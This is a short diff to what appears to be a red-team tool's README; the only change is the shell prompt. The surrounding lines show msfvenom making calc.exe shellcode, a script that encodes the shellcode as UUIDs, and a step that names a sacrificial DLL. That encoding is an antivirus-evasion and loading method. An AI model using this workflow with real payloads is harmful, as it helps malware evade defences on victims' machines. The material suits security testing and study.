@@ -3,7 +3,7 @@
 
 ## MSFVenom PopCalc Shellcode Creation
 ```bash
-┌──(kali㉿kali)-[~]
+┌──(bobby.cooke@0xBoku)-[~]
 └─$ msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -14,7 +14,7 @@ Saved as: calc.bin
 
 ## Raw Shellcode File to UUIDs
 ```bash
-┌──(kali㉿kali)-[~]
+┌──(bobby.cooke@0xBoku)-[~]
 └─$ python3 bin2uuid.py calc.bin                                                                      
     const char* uuids[] =
     {
@@ -43,7 +43,7 @@ Saved as: calc.bin
 
 ## Optionally Change Sacraficial DLL
 ```bash
-┌──(kali㉿kali)-[~]
+┌──(bobby.cooke@0xBoku)-[~]
 └─$ python3 string2array.py sLib mshtml.dll
 CHAR sLib[] = {'m','s','h','t','m','l','.','d','l','l',0};
 ```
